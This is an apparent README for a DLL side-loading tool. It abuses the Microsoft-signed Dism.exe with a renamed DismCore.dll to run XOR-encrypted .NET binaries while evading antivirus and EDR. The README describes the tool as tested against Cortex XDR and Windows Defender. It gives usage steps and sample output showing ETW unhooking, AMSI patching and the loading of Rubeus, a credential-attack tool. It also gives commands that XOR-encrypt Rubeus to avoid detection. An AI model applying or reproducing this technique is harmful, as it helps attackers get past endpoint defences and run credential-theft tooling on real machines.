# Dism DLL Side Loader
Combine Microsoft signed Dism and dll side load netloader to load c# or .NET binary to bypass AV. 
Tested on 22-10-2022 with Cortex XDR and Windows Defender.

## Usage
Compile the dll library, change name of dll to "DismCore.dll", put Dism.exe and DismCore.dll in the same directory and run.

```
.\Dism.exe
[+] Successfully unhooked ETW!
[+] Successfully patched AMSI!
==>Path: D:\tools\xor_rubeus
==>key: P
==>args:
[+] Decrypting XOR encrypted binary using key 'P'
[+] URL/PATH : D:\tools\AV bypass\Netloader_orginal\xor_ru Arguments :

   ______        _
  (_____ \      | |
   _____) )_   _| |__  _____ _   _  ___
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v2.2.0
```
## Encrypt XOR binary
use xor&#46;py
### Encryption
```
cat Rubeus.exe | python xor.py "P" > xor_ru
```
### Decryption
```
cat xor_ru | python xor.py "P" > Rubeus.exe
```
## TODO
Add AES encryption

## Credit
May need to run DllExport.bat before compile.
https://jackkuo.org/post/export_unmanaged_dll_from_csharp/

Netloader
https://github.com/Flangvik/NetLoader

xor&#46;py
https://github.com/ShawnDEvans/xorpy

Thank you darklab people. Especially Erwin and Dennis ^^
